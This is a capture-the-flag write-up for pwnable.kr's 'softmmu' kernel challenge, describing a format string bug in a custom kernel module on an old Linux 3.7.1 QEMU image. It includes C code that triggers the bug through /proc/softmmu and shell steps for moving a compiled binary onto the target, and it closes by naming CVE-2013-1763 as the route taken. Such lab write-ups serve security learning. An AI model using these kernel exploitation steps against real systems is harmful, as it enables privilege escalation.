---
layout: page
title: pwnable.kr - softmmu
file_path: softmmu
category: pwnablekr
subcategory: hackers_secret
tags: [writeup, pwn, pwnablekr]
---

### Overwiew

readme:
```
If you are good at kernel exploit, try this one :)
```

We are given a QEMU machine with pretty old kernel and custom module loaded.

```
...
[+] Loading x86 PAE MMU emulator
[+] Write the virtual address to /proc/softmmu
[+] You can obtain it's physical address by reading /proc/softmmu
[+] i.e. echo -ne '\x00\x80\x04\x08' > /proc/softmmu; hexdump -C /proc/softmmu
[+] Let the kernel exploit begin :)

$ uname -a
Linux (none) 3.7.1 #1 SMP Mon Dec 23 06:07:19 PST 2013 i686 GNU/Linux
$ ls /*.ko
/softmmu.ko
```

The module (softmmu.ko) is pretty simple. We may write 4 byte address to a global variable and then
`printk` it. So there is format string vulnerability.

```c
#include "raw_sploit.h"

/*
~Gros
*/

#define MAX 10000

int _start(int argc, char const *argv[])
{
    char map[MAX] = {};
    int fd;

    /* mmap in userland */
    unsigned long mmap_start, mmap_size;
    mmap_start = 0xdead000;
    mmap_size = 0x12000;
    char* payload = (char*)mmap((void*)mmap_start, mmap_size, PROT_READ|PROT_WRITE|PROT_EXEC,
                    MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0);
    if ((long)payload < 0) {
        write(1, "mmap fault\n", 11);
        exit(1);
    }

    char mmaped_hex[16] = {};
    write(1, "payload at 0x", 13);
    dechex((unsigned long)payload, mmaped_hex, 16, 1);
    write(1, mmaped_hex, 8);
    write(1, "\n", 1);

    /* copy argv[1] to the mapped page */
    memcpy(payload, &argv[0], strlen((char*)&argv[0]));

    /* open softmmu and write address of mmaped page */
    fd = open("/proc/softmmu", O_RDWR);
    if(fd == -1) {
        write(1, "open fault\n", 11);
        exit(1);
    }

    if (write(fd, (char*)&payload, 4) < 4) {
        write(1, "written less than 4 bytes\n", 26);
    }
    
    /* output the result */
    read(fd, map, MAX);
    write(1, map, 4);
    close(fd);

    exit(0);
}
```

Note: there is no networking in the remote QEMU, the exploit needs to be copy-pasted:
```sh
# local:
gcc  -fno-builtin -static -nostdlib -m32 -o exp exp.c
tar -czvf exp.tar.gz exp
cat exp.tar.gz | base64 -w0

# remote:
cd /tmp && cat > exp.tar.gz.b64
base64 -d exp.tar.gz.b64 > exp.tar.gz && tar -xf ./exp.tar.gz
./exp
```

Because of that [raw_sploit.h](/assets/other/raw_sploit.h) is used.

Now, I know only one way of exploiting format strings: with `%n` formatter.
Support for this magic conversion specifier was removed in newer kernels, but
as it turns out, it works in our 3.7.1 version. Despite of what is written in [source code](https://elixir.bootlin.com/linux/v3.7.1/source/lib/vsprintf.c#L1354). This comment misleaded me,
so I did not even try to exploit the fmt bug. Instead, I have found CVE-2013-1763.

